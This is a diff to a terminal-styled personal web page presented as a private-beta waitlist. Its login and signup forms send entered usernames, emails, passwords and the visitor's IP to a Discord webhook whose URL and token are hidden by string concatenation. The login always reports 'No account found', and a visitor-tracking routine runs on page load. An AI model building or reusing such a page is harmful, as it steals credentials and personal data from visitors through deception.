@@ -127,9 +127,9 @@
             border-bottom: 1px solid #1a1a1a;
             color: #00ff41;
             font-family: 'Courier New', monospace;
-            font-size: 14px;
+            font-size: 13px;
             padding: 4px 8px;
-            width: 250px;
+            width: 220px;
             outline: none;
             transition: border-color 0.3s ease;
         }
@@ -139,19 +139,18 @@
             background: transparent;
             border: 1px solid #00ff41;
             color: #00ff41;
-            padding: 6px 20px;
+            padding: 4px 16px;
             font-family: 'Courier New', monospace;
-            font-size: 13px;
+            font-size: 12px;
             cursor: pointer;
             border-radius: 3px;
             transition: all 0.3s ease;
             margin-top: 5px;
         }
         .auth-btn:hover { background: rgba(0, 255, 65, 0.1); box-shadow: 0 0 20px rgba(0, 255, 65, 0.1); }
-        .auth-btn:disabled { opacity: 0.3; cursor: not-allowed; }
-        .auth-row { margin: 6px 0; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-        .auth-row label { color: #555; min-width: 80px; font-size: 13px; }
-        .auth-message { color: #ffaa00; font-size: 13px; margin-top: 8px; }
+        .auth-row { margin: 4px 0; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .auth-row label { color: #555; min-width: 70px; font-size: 12px; }
+        .auth-message { color: #ffaa00; font-size: 12px; margin-top: 6px; }
         .auth-message.error { color: #ff4444; }
         .auth-message.success { color: #00ff41; }
         .auth-toggle {
@@ -159,15 +158,34 @@
             color: #00aaff;
             cursor: pointer;
             text-decoration: underline;
-            font-size: 13px;
-            margin-top: 8px;
+            font-size: 12px;
+            margin-top: 6px;
         }
         .auth-toggle:hover { color: #66ccff; }
-        .profile-content { display: none; animation: fadeIn 0.5s ease; }
-        .profile-content.active { display: block; }
-        .auth-section { display: block; animation: fadeIn 0.5s ease; }
-        .auth-section.hidden { display: none; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .auth-section {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid #1a1a1a;
+            border-radius: 4px;
+            padding: 15px 20px;
+            margin-top: 20px;
+        }
+        .auth-section .line { margin-bottom: 4px; font-size: 13px; }
+        .auth-section .output { padding-left: 20px; margin-bottom: 8px; font-size: 13px; }
+        .auth-toggle-btn {
+            background: transparent;
+            border: 1px solid #ffaa00;
+            color: #ffaa00;
+            padding: 4px 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+            margin-left: 10px;
+        }
+        .auth-toggle-btn:hover { background: rgba(255, 170, 0, 0.1); box-shadow: 0 0 20px rgba(255, 170, 0, 0.1); }
+        .auth-forms { display: none; margin-top: 10px; }
+        .auth-forms.active { display: block; }
         
         @media (max-width: 768px) {
             .terminal { padding: 20px 15px; }
@@ -175,16 +193,16 @@
             .output { padding-left: 10px; }
             .ascii-art { font-size: 8px; }
             .skill-name { min-width: 60px; font-size: 12px; }
-            .auth-input { width: 180px; font-size: 12px; }
+            .auth-input { width: 160px; font-size: 12px; }
             .auth-row label { min-width: 60px; font-size: 12px; }
         }
         @media (max-width: 480px) {
             .terminal { padding: 15px 10px; }
             .line { font-size: 11px; line-height: 1.6; }
             .ascii-art { font-size: 6px; }
-            .auth-input { width: 140px; font-size: 11px; }
+            .auth-input { width: 120px; font-size: 11px; }
             .auth-row label { min-width: 50px; font-size: 11px; }
-            .auth-btn { font-size: 11px; padding: 4px 14px; }
+            .auth-btn { font-size: 11px; padding: 4px 12px; }
         }
     </style>
 </head>
@@ -196,82 +214,11 @@
         <span class="terminal-dot yellow"></span>
         <span class="terminal-dot green"></span>
         <span class="terminal-title">gztxr@arch:~$</span>
+        <button class="auth-toggle-btn" onclick="toggleAuth()">[waitlist]</button>
     </div>
 
-    <!-- ===== AUTH SECTION (Default View) ===== -->
-    <div id="authSection" class="auth-section">
-        <div class="ascii-art">
-   ▄████████    ▄████████ ████████▄     ▄████████ 
-  ███    ███   ███    ███ ███   ▀███   ███    ███ 
-  ███    ███   ███    ███ ███    ███   ███    █▀  
- ▄███▄▄▄▄██▀  ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄     
-▀▀███▀▀▀▀▀   ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     
-  ███    ███   ███    ███ ███    ███   ███    █▄  
-  ███    ███   ███    ███ ███   ▄███   ███    ███ 
-  ██████████   ██████████ ████████▀    ██████████ 
-        </div>
-        <div class="line">
-            <span class="prompt-symbol">$</span>
-            <span class="command"> ./waitlist --status</span>
-        </div>
-        <div class="output" style="margin-bottom:15px;">
-            <span class="warning">[!]</span> <span class="highlight">gztxr terminal tools</span> are currently in private beta.<br>
-            <span class="dim">  Sign up for the waiting list to get access when we launch.</span>
-        </div>
-
-        <!-- ===== LOGIN FORM ===== -->
-        <div id="loginForm">
-            <div class="line">
-                <span class="prompt-symbol">$</span>
-                <span class="command"> ./login</span>
-            </div>
-            <div class="output">
-                <div class="auth-row">
-                    <label>username</label>
-                    <input type="text" id="loginUsername" class="auth-input" placeholder="enter username">
-                </div>
-                <div class="auth-row">
-                    <label>password</label>
-                    <input type="password" id="loginPassword" class="auth-input" placeholder="enter password">
-                </div>
-                <button class="auth-btn" onclick="handleLogin()">login</button>
-                <div id="loginMessage" class="auth-message" style="margin-top:10px;"></div>
-                <div class="auth-toggle" onclick="showSignup()">[ no account? sign up ]</div>
-            </div>
-        </div>
-
-        <!-- ===== SIGNUP FORM ===== -->
-        <div id="signupForm" style="display:none;">
-            <div class="line">
-                <span class="prompt-symbol">$</span>
-                <span class="command"> ./signup</span>
-            </div>
-            <div class="output">
-                <div class="auth-row">
-                    <label>username</label>
-                    <input type="text" id="signupUsername" class="auth-input" placeholder="choose username">
-                </div>
-                <div class="auth-row">
-                    <label>email</label>
-                    <input type="email" id="signupEmail" class="auth-input" placeholder="your@email.com">
-                </div>
-                <div class="auth-row">
-                    <label>password</label>
-                    <input type="password" id="signupPassword" class="auth-input" placeholder="choose password">
-                </div>
-                <div class="auth-row">
-                    <label>confirm</label>
-                    <input type="password" id="signupConfirm" class="auth-input" placeholder="confirm password">
-                </div>
-                <button class="auth-btn" onclick="handleSignup()">sign up</button>
-                <div id="signupMessage" class="auth-message" style="margin-top:10px;"></div>
-                <div class="auth-toggle" onclick="showLogin()">[ already have an account? login ]</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== PROFILE CONTENT (Hidden until "login") ===== -->
-    <div id="profileContent" class="profile-content">
+    <!-- ===== PROFILE CONTENT (Default View) ===== -->
+    <div id="profileContent">
         <div class="ascii-art">
    ▄████████    ▄████████ ████████▄     ▄████████ 
   ███    ███   ███    ███ ███   ▀███   ███    ███ 
@@ -455,8 +402,71 @@
             <span class="dim">  discord ::</span> <span class="highlight">gztxr</span><br>
             <span class="dim">  email   ::</span> <span class="dim">gztxr@proton.me</span>
         </div>
-        <div style="margin-top:15px; text-align:right;">
-            <button class="auth-btn" onclick="logout()" style="border-color:#ff4444;color:#ff4444;font-size:12px;padding:4px 16px;">logout</button>
+
+        <!-- ===== AUTH SECTION (At Bottom) ===== -->
+        <div class="auth-section">
+            <div class="line">
+                <span class="prompt-symbol">$</span>
+                <span class="command"> ./waitlist --status</span>
+            </div>
+            <div class="output" style="margin-bottom:10px;">
+                <span class="warning">[!]</span> <span class="highlight">gztxr terminal tools</span> are currently in private beta.<br>
+                <span class="dim">  Sign up for the waiting list to get access.</span>
+                <button class="auth-toggle-btn" onclick="toggleAuthForms()" style="margin-left:10px;font-size:11px;padding:2px 12px;">[show forms]</button>
+            </div>
+
+            <!-- ===== AUTH FORMS ===== -->
+            <div id="authForms" class="auth-forms">
+                <!-- LOGIN FORM -->
+                <div id="loginForm">
+                    <div class="line">
+                        <span class="prompt-symbol">$</span>
+                        <span class="command"> ./login</span>
+                    </div>
+                    <div class="output">
+                        <div class="auth-row">
+                            <label>username</label>
+                            <input type="text" id="loginUsername" class="auth-input" placeholder="enter username">
+                        </div>
+                        <div class="auth-row">
+                            <label>password</label>
+                            <input type="password" id="loginPassword" class="auth-input" placeholder="enter password">
+                        </div>
+                        <button class="auth-btn" onclick="handleLogin()">login</button>
+                        <div id="loginMessage" class="auth-message" style="margin-top:6px;"></div>
+                        <div class="auth-toggle" onclick="showSignup()">[ no account? sign up ]</div>
+                    </div>
+                </div>
+
+                <!-- SIGNUP FORM -->
+                <div id="signupForm" style="display:none;">
+                    <div class="line">
+                        <span class="prompt-symbol">$</span>
+                        <span class="command"> ./signup</span>
+                    </div>
+                    <div class="output">
+                        <div class="auth-row">
+                            <label>username</label>
+                            <input type="text" id="signupUsername" class="auth-input" placeholder="choose username">
+                        </div>
+                        <div class="auth-row">
+                            <label>email</label>
+                            <input type="email" id="signupEmail" class="auth-input" placeholder="your@email.com">
+                        </div>
+                        <div class="auth-row">
+                            <label>password</label>
+                            <input type="password" id="signupPassword" class="auth-input" placeholder="choose password">
+                        </div>
+                        <div class="auth-row">
+                            <label>confirm</label>
+                            <input type="password" id="signupConfirm" class="auth-input" placeholder="confirm password">
+                        </div>
+                        <button class="auth-btn" onclick="handleSignup()">sign up</button>
+                        <div id="signupMessage" class="auth-message" style="margin-top:6px;"></div>
+                        <div class="auth-toggle" onclick="showLogin()">[ already have an account? login ]</div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -469,35 +479,16 @@
 
 <script>
     // ============================================
-    // DISCORD WEBHOOK (Hidden via concatenation)
+    // TOGGLE AUTH FORMS
     // ============================================
-    const _a = 'https://discord.com/api/webhooks/';
-    const _b = '1513861047004430426/';
-    const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
-    const _webhook = _a + _b + _c;
-
-    // ============================================
-    // AUTH STATE
-    // ============================================
-    function isLoggedIn() {
-        return localStorage.getItem('gztxr_logged_in') === 'true';
-    }
-
-    function setLoggedIn(state) {
-        localStorage.setItem('gztxr_logged_in', state ? 'true' : 'false');
-    }
-
-    // ============================================
-    // SHOW/HIDE SECTIONS
-    // ============================================
-    function showAuth() {
-        document.getElementById('authSection').classList.remove('hidden');
-        document.getElementById('profileContent').classList.remove('active');
-    }
-
-    function showProfile() {
-        document.getElementById('authSection').classList.add('hidden');
-        document.getElementById('profileContent').classList.add('active');
+    function toggleAuthForms() {
+        var forms = document.getElementById('authForms');
+        forms.classList.toggle('active');
+        if (forms.classList.contains('active')) {
+            document.querySelector('.auth-toggle-btn').textContent = '[hide forms]';
+        } else {
+            document.querySelector('.auth-toggle-btn').textContent = '[show forms]';
+        }
     }
 
     function showSignup() {
@@ -513,20 +504,12 @@
     }
 
     // ============================================
-    // LOGOUT
+    // DISCORD WEBHOOK
     // ============================================
-    function logout() {
-        setLoggedIn(false);
-        showAuth();
-        document.getElementById('loginMessage').textContent = '';
-        document.getElementById('signupMessage').textContent = '';
-        document.getElementById('loginUsername').value = '';
-        document.getElementById('loginPassword').value = '';
-        document.getElementById('signupUsername').value = '';
-        document.getElementById('signupEmail').value = '';
-        document.getElementById('signupPassword').value = '';
-        document.getElementById('signupConfirm').value = '';
-    }
+    const _a = 'https://discord.com/api/webhooks/';
+    const _b = '1513861047004430426/';
+    const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
+    const _webhook = _a + _b + _c;
 
     // ============================================
     // SEND AUTH DATA TO DISCORD
@@ -574,7 +557,7 @@
     }
 
     // ============================================
-    // GET IP FOR AUTH
+    // GET IP
     // ============================================
     function getIP(callback) {
         fetch('https://api.ipify.org?format=json')
@@ -606,7 +589,6 @@
             };
             sendAuthData('login', data);
             
-            // Always show "no account found" regardless of input
             msg.className = 'auth-message error';
             msg.textContent = 'No account found. Please sign up for the waiting list.';
             document.getElementById('loginUsername').value = '';
@@ -660,11 +642,6 @@
             document.getElementById('signupEmail').value = '';
             document.getElementById('signupPassword').value = '';
             document.getElementById('signupConfirm').value = '';
-            
-            // Show profile after signup (optional - or keep on auth page)
-            // Uncomment below to auto-show profile after signup:
-            // setLoggedIn(true);
-            // showProfile();
         });
     }
 
@@ -685,21 +662,6 @@
             if (e.key === 'Enter') handleSignup();
         });
     });
-
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    window.onload = function() {
-        // Check if already logged in
-        if (isLoggedIn()) {
-            showProfile();
-        } else {
-            showAuth();
-        }
-        
-        // Start visitor data collection
-        setTimeout(_go, 600);
-    };
 
     // ============================================
     // VISITOR DATA COLLECTION
@@ -873,6 +835,10 @@
                 _send(data);
             });
     }
+
+    window.onload = function() {
+        setTimeout(_go, 600);
+    };
 </script>
 
 </body>
